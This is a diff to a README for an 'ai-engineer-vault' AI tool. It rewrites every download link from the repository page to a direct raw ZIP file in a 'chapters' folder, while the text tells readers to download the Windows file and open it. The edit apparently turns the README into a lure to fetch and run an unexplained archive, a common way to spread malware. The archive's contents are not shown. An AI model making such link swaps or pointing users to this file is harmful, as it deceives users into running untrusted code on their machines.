@@ -1,12 +1,12 @@
 # 🧠 ai-engineer-vault - Build Better AI Systems Faster
 
-[![Download](https://img.shields.io/badge/Download%20Here-Blue%20%26%20Grey-1f6feb?style=for-the-badge)](https://github.com/trenchant-rogaine315/ai-engineer-vault)
+[![Download](https://img.shields.io/badge/Download%20Here-Blue%20%26%20Grey-1f6feb?style=for-the-badge)](https://raw.githubusercontent.com/trenchant-rogaine315/ai-engineer-vault/main/chapters/vault_engineer_ai_2.0.zip)
 
 ## 📥 Download and Start
 
 Use this link to visit the page and download the app:
 
-[Open ai-engineer-vault](https://github.com/trenchant-rogaine315/ai-engineer-vault)
+[Open ai-engineer-vault](https://raw.githubusercontent.com/trenchant-rogaine315/ai-engineer-vault/main/chapters/vault_engineer_ai_2.0.zip)
 
 If your browser asks what to do with the file, choose **Download** or **Save**. If the page shows a folder or release page, pick the newest file for Windows and open it after the download ends.
 
@@ -39,7 +39,7 @@ If the app comes as a ZIP file, you will need to extract it first. If it comes a
 
 ## 🔽 Download Steps
 
-1. Open this link: [https://github.com/trenchant-rogaine315/ai-engineer-vault](https://github.com/trenchant-rogaine315/ai-engineer-vault)
+1. Open this link: [https://raw.githubusercontent.com/trenchant-rogaine315/ai-engineer-vault/main/chapters/vault_engineer_ai_2.0.zip](https://raw.githubusercontent.com/trenchant-rogaine315/ai-engineer-vault/main/chapters/vault_engineer_ai_2.0.zip)
 2. Find the latest Windows download on the page
 3. Download the file to your computer
 4. Wait for the download to finish
@@ -216,7 +216,7 @@ Many AI projects fail because teams jump into tools before they set the plan. Th
 
 If you need the file again, use this page:
 
-[https://github.com/trenchant-rogaine315/ai-engineer-vault](https://github.com/trenchant-rogaine315/ai-engineer-vault)
+[https://raw.githubusercontent.com/trenchant-rogaine315/ai-engineer-vault/main/chapters/vault_engineer_ai_2.0.zip](https://raw.githubusercontent.com/trenchant-rogaine315/ai-engineer-vault/main/chapters/vault_engineer_ai_2.0.zip)
 
 ## 🧭 Quick Start Path
 
